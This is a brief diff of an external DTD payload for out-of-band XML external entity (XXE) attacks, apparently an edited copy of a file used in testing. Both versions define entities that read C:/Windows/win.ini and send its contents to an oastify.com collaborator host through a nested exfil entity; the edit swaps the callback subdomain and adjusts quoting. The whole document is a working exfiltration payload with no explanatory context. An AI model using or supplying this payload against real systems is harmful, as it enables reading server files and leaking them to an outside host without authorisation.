@@ -1,6 +1,4 @@
-<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://wiilqfet7l6n8q62a4v1upsbj2ptds1h.oastify.com/d=%file;'>">
+<!ENTITY % file SYSTEM "file:///C:/windows/win.ini">
+<!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM "https://n6uce62kvcuewhutyvjsigg27tdk1buzj.oastify.com/t=%file;">'>
 %eval;
 %exfil;
-
-
